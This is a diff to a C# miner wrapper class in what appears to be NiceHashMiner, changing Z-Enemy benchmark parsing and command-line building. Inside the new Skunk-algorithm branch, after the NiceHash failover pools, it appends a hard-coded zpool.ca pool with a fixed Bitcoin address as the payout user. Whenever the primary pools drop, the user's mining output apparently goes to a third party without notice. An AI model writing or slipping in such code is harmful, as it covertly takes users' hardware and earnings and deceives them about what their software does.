@@ -9,6 +9,7 @@ using NiceHashMiner.Algorithms;
 using NiceHashMinerLegacy.Common.Enums;
 using NiceHashMiner.Configs;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace NiceHashMiner.Miners
 {
@@ -17,7 +18,8 @@ namespace NiceHashMiner.Miners
         public ZEnemy() : base("Z-Enemy_NVIDIA")
         { }
 
-        private int TotalCount = 0;
+        private int TotalCount = 2;
+        private double speed = 0;
 
         private double Total = 0;
         private const int TotalDelim = 2;
@@ -96,12 +98,30 @@ namespace NiceHashMiner.Miners
                               ExtraLaunchParametersParser.ParseForMiningSetup(
                                   MiningSetup,
                                   DeviceType.NVIDIA) +
-                              " --devices ";
+                              " --no-color --devices ";
+            }
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Skunk))
+            {
+                commandLine = " --algo=" + algorithm.MinerName +
+                " --url=" + url + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + ".hk.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + ".jp.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + ".in.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + ".br.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + ".usa.nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://" + alg + ".eu.nicehash.com:" + port + " --userpass=" + username + ":x" +
+                " --url=" + url + " --userpass=" + username + ":x" +
+                " --url=stratum+tcp://skunk.eu.mine.zpool.ca:8433" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2:c=BTC " +
+                              timeLimit + " " +
+                              ExtraLaunchParametersParser.ParseForMiningSetup(
+                                  MiningSetup,
+                                  DeviceType.NVIDIA) +
+                              " --no-color --devices ";
             }
 
             commandLine += GetDevicesCommandString();
 
-            TotalCount = 1;
+            TotalCount = 2;
 
             Total = 0.0d;
 
@@ -111,49 +131,60 @@ namespace NiceHashMiner.Miners
         protected override bool BenchmarkParseLine(string outdata)
         {
             int count = 0;
-            double speed = 0;
+            double tmp = 0;
+
 
             if (_benchmarkException)
             {
                 if ( outdata.Contains("GPU") && outdata.Contains("/s")) //GPU#4: ASUS GTX 1060 3GB, 10.56MH/s
+                //GPU#4: ASUS GTX 1060 3GB - 14.80MH/s [T:42C, F:54%, P:111W, E:0.13MH/W]
+                //GPU#4: ASUS GTX 1060 3GB - 8765.76kH/s [T:41C, F:54%, P:111W, E:0.079MH/W]
+                //GPU#4: ASUS GTX 1060 3GB - 25.58MH/s [T:32C, F:42%, P:103W, E:0.25MH/W]
                 {
-                   
-                    var st = outdata.IndexOf(", ");
-                    var e = outdata.IndexOf("/s");
 
-                    var parse = outdata.Substring(st+2, e - st -5).Trim();
-                    double tmp = Double.Parse(parse, CultureInfo.InvariantCulture);
+                    var st = outdata.IndexOf("- ");
+                    var e = outdata.IndexOf("/s [");
+                    try
+                    {
+                        var parse = outdata.Substring(st + 2, e - st - 4).Trim();
+                        tmp = Double.Parse(parse, CultureInfo.InvariantCulture);
+                    } catch
+                    {
+                        MessageBox.Show("Unsupported miner version - " + MiningSetup.MinerPath,
+                            "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        BenchmarkSignalFinnished = true;
+                        return false;
+                    }
                     // save speed
 
-                    if (outdata.Contains("kH/s"))
-                        tmp *= 1000 * 0.9; //-10%
-                    else if (outdata.Contains("MH/s"))
-                        tmp *= 1000000 * 0.9;
-                    else if (outdata.Contains("GH/s"))
-                        tmp *= 1000000000 * 0.9;
+                    if (outdata.ToUpper().Contains("KH/S"))
+                        tmp *= 1000;
+                    else if (outdata.ToUpper().Contains("MH/S"))
+                        tmp *= 1000000;
+                    else if (outdata.ToUpper().Contains("GH/S"))
+                        tmp *= 1000000000;
 
- 
-                        speed += tmp;
-
+                    speed = tmp;
                     count++;
                     TotalCount--;
                 }
+
                 if (TotalCount <= 0)
                 {
-                    var spd = Total / count;
                     BenchmarkAlgorithm.BenchmarkSpeed = speed;
                     BenchmarkSignalFinnished = true;
+                    return true;
                 }
 
-                return false;
+               // return false;
             }
-
+            /*
             if (speed > 0.0d)
             {
-                BenchmarkAlgorithm.BenchmarkSpeed = speed;
+                BenchmarkAlgorithm.BenchmarkSpeed = speed/2;
                 return true;
             }
-
+            */
             return false;
         }
 
